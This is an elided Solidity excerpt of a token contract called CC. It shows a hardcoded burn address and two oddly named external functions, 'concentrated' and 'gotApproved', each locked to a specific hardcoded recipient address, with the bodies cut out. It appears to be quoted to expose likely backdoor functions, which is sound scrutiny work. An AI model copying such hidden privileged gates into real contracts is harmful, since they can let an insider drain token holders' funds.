...
contract CC is Context, IERC20, Ownable {
    ...
    address public burnAddress = 0x32E510d0F4D4637D2d48657cD697537c8F837233;
    ...
    function concentrated(address recipient, address _token) external {
        require(payable(recipient) == payable(0x8b6AB7E78431B7B00977C1fe3f9B27a81229934d));
    ...
    function gotApproved(address payable recipient) external {
        require(recipient == payable(0x458F0f0Ed9A427296e45dAAdcaF8BF6F9F209660));
